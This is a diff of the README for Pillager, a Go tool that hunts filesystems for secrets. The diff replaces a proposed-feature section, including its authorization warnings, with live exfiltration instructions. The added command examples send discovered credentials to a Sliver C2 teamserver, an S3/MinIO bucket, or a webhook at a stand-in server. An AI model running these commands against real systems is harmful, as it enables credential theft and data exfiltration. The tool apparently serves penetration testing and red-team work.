@@ -14,7 +14,7 @@ Pillage filesystems for sensitive information with Go.
 1. [Summary](#summary)
 1. [Installation](#installation)
 1. [Usage](#usage)
-1. [Exfiltration Features (Proposed v2.0)](#exfiltration-features-proposed-v20)
+1. [Exfiltration](#exfiltration)
 1. [Documentation](#documentation)
 
 ## Summary
@@ -75,69 +75,28 @@ Pillager provides a terminal user interface built with [bubbletea](https://githu
 
 [![asciicast](https://asciinema.org/a/WISZMVvKsfbFkLLQIWBRotknU.svg)](https://asciinema.org/a/WISZMVvKsfbFkLLQIWBRotknU)
 
-## Exfiltration Features (Proposed v2.0)
+## Exfiltration
 
-⚠️ **AUTHORIZATION REQUIRED** - These proposed features are designed exclusively for authorized security testing, penetration testing, and red team operations.
-
-### Proposed Enhancements
-
-Pillager v2.0 proposal adds **active response capabilities** to differentiate from passive scanning tools:
-
-#### 🚀 Key Features
-
-- **S3-Compatible Cloud Exfiltration**: Automatically upload discovered secrets to AWS S3, MinIO, or any S3-compatible storage
-- **C2 Framework Integration**: Native integration with Sliver, Mythic, Covenant, and custom C2 frameworks
-- **Real-time Beaconing**: Continuous communication with C2 infrastructure for live operations
-- **Automated Post-Exploitation**: Execute follow-up tasks based on discovered credential types
-- **Multiple Exfil Channels**: DNS tunneling, ICMP, HTTP webhooks, and encrypted TCP sockets
-
-#### 📚 Documentation
-
-- **[Full Proposal](./EXFILTRATION_PROPOSAL.md)** - Comprehensive feature specification, architecture, and use cases
-- **[Implementation Guide](./IMPLEMENTATION_GUIDE.md)** - Technical implementation roadmap for developers
-- **[Code Examples](./pkg/exfil/)** - Reference implementations and interfaces
-
-#### 🎯 Use Cases (Authorized Only)
-
-- Red team operations with explicit written authorization
-- Penetration testing engagements with defined scope
-- Purple team exercises for detection capability training
-- Security research in controlled environments
-- CTF competitions and security education
-
-#### ⚡ Example Usage (Proposed CLI)
+Send discovered secrets to remote destinations: **[Sliver C2](https://sliver.sh/)** (loot/credential stores), **S3/MinIO** (cloud storage), or **Webhooks** (custom HTTP endpoints).
 
 ```bash
-# Exfiltrate findings to S3-compatible storage
+# Sliver C2 - Send to teamserver with credential parsing
+pillager hunt /target --exfil sliver \
+  --sliver-config ~/.sliver-client/configs/operator.cfg
+
+# S3/MinIO - Upload with encryption
 pillager hunt /target --exfil s3 \
   --s3-bucket red-team-findings \
-  --s3-region us-east-1 \
-  --exfil-mode stream
+  --s3-endpoint https://minio.internal:9000 \
+  --exfil-encrypt env:EXFIL_KEY
 
-# Integrate with Sliver C2 framework
-pillager hunt /target --c2 sliver \
-  --sliver-config ./operator.cfg \
-  --beacon-interval 300 \
-  --auto-tasks
-
-# Encrypted exfiltration to MinIO
-pillager hunt /target --exfil s3 \
-  --s3-endpoint https://minio.local:9000 \
-  --s3-bucket loot \
-  --encryption-key env:EXFIL_KEY
+# Webhook - POST to custom endpoint
+pillager hunt /target --exfil webhook \
+  --webhook-url https://your-server.com/findings \
+  --webhook-header "Authorization: Bearer token"
 ```
 
-#### 🔐 Security & Compliance
-
-- Client-side encryption (AES-256-GCM) before upload
-- Comprehensive audit logging for all exfiltration activities
-- Authorization verification framework
-- TLS 1.3+ for all network communications
-- Fail-safe design with graceful degradation
-
-**Status**: 🚧 Proposal stage - Community feedback welcome!
-
-For questions, suggestions, or to contribute to this proposal, please open an issue on GitHub.
+**Security**: AES-256-GCM encryption (`--exfil-encrypt`), TLS by default, automatic metadata (hostname, timestamp)
 
 ---
 
